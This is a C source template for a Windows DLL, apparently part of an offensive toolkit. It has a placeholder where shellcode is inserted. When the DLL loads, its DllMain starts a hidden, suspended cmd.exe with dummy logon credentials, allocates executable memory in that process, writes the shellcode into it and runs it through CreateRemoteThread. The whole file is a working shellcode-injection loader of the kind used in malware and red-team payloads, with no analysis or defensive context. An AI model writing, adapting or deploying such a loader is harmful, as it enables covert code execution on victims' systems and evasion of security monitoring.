#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

%%BUFFER%%

DWORD WINAPI RunMe()
{
	HANDLE pHandle;
	PVOID remoteBuffer;
	STARTUPINFO SI = { 0 };
	PROCESS_INFORMATION PI = { 0 };	
	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(SI);
	ZeroMemory(&PI, sizeof(PI));
	SI.dwFlags = 1;
	SI.wShowWindow = 0;
	if(!CreateProcessWithLogonW(L"aaa", L"bbb", L"ccc", 0x00000002, L"C:\\Windows\\System32\\cmd.exe", NULL, 0x04000000, NULL, L"c:\\windows\\system32\\", &SI, &PI)) {
		return 0;
	}
	pHandle = PI.hProcess;
	remoteBuffer = VirtualAllocEx(pHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (remoteBuffer != NULL)
	{
		WriteProcessMemory(pHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
		CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	}
	CloseHandle(pHandle);
	CloseHandle(PI.hThread);
	return 0;
}


BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
	switch( dwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
	        RunMe();
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }

    return FALSE;
}
